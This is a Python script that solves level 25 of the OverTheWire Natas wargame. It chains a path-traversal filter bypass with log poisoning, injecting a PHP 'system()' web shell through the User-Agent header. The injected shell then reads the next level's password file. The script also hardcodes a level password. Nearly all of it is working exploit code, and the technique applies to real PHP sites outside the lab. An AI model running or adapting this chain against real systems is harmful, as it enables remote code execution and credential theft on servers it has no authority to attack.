#!/usr/bin/python3.9

"""This script is a solution to Overthewire Natas level 25."""

import binascii
import requests as r
from requests.auth import HTTPBasicAuth
from fake_useragent import UserAgent

url = "http://natas25.natas.labs.overthewire.org/"

lvl_user = "natas25"
lvl_pass = "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"

headers = {
    "User-Agent": UserAgent().random
    }

try:
    res_token = r.get(
        url,
        auth=HTTPBasicAuth(lvl_user, lvl_pass))

    sid = res_token.cookies['PHPSESSID']

    res = r.get(
        url,
        cookies={"PHPSESSID": sid},
        params={
            "cmd": "/bin/cat /etc/natas_webpass/natas26",
            "lang": 5*"....//"+f"var/www/natas/natas25/logs/natas25_{sid}.log"
            },
        headers={"User-Agent": "@@@@@<?php system($_REQUEST['cmd']); ?>@@@@@"},
        auth=HTTPBasicAuth(lvl_user, lvl_pass))
    
    status = res.status_code

    if status == 200:
        password = res.text.split("@@@@@")[-2]
        password = password.rstrip()

except Exception as e:
    print("[ERROR]", e, "\n")
    exit(-1)

if password and password.isalnum() and len(password) == 32:
    print("[PASSWORD]", password)
else:
    print(
        f"[FAIL] - [Status: {status}]",
        f"[Password({len(password)}): {password}]")